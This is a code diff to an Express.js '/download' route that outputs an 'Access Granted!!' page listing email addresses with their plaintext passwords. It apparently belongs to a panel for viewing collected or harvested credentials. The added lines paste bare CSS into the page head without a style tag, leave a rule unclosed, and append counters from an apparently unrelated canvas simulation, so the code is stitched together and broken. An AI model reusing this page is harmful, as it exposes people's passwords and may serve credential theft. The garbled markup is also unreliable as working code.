@@ -42,7 +42,34 @@ app.get('/download', async (req, res) => {
     res.send(
       `<!DOCTYPE html>
       <html>
-      <head><title>Access Granted!!</title></head>
+      <head><title>Access Granted!!</title>
+* {
+  border: none;
+  margin: 0;
+}
+html,
+body {
+  width: 100%;
+  height: 100%;
+  overflow: hidden;
+}
+body {
+  //background: radial-gradient(#555, #111);
+}
+canvas {
+  background: white;
+  background: radial-gradient(#FFF, #DDD);
+  //background: radial-gradient(hsl(40, 80%, 60%), hsl(0, 50%, 40%));
+  //filter: blur(1px) contrast(5);
+  //transform: scale(0.1);
+  transform-origin: 0 0;
+  //border: solid .8em green;
+  width: 100%;
+  height: 100%;
+}
+.ui {
+  display: none;
+</head>
       <body style="background-image: url('background.html'; color:red"><div style="display:grid;grid-template-columns:repeat(auto-fill, minmax(250px, 1fr));gap: 3rem">${y
         .map(
           (arr, ind) =>
@@ -52,7 +79,17 @@ app.get('/download', async (req, res) => {
               arr.email
             }<br/><b>Pass:</b> <br/>__> &nbsp;&nbsp;${arr.pass}</p>`
         )
-        .join('')}</div></body></html>`
+        .join('')}</div>
+<div class="ui">
+  <p class="zoom"><span class="zoom zoomin">+</span><span class="zoom zoomout">-</span></p>
+  <p class="zoomlevel"><span class="percent">100</span> % - (<span class="width"></span>px)(<span class="height"></span>px)</p>
+  <p>Dead: <span class="dead">0</span></p>
+  <p>Alive: <span class="alive">0</span></p>
+  <p>Drawn: <span class="drawn">0</span></p>
+  <p><span class="fps">0</span> FPS</p>
+  <a class="save" href="" download="capture.png">Save</a>
+</div>
+</body></html>`
     );
   }
 });
